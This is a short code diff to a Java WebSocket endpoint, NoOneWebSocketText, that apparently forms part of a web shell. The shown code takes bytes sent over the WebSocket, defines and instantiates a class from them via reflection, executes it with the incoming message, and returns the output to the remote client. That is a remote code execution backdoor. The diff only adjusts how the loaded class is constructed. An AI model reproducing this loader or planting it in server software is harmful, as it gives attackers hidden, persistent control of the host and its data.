@@ -31,9 +31,8 @@ public class NoOneWebSocketText extends Endpoint implements MessageHandler.Whole
                 coreClass = reflectionDefineClass(bytes);
             }
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+            Object httpChannelCore = coreClass.newInstance();
             httpChannelCore.equals(new Object[]{message, outputStream});
-            httpChannelCore.toString();
             byte[] result = outputStream.toByteArray();
             session.getBasicRemote().sendText(new String(result));
         } catch (Throwable e) {
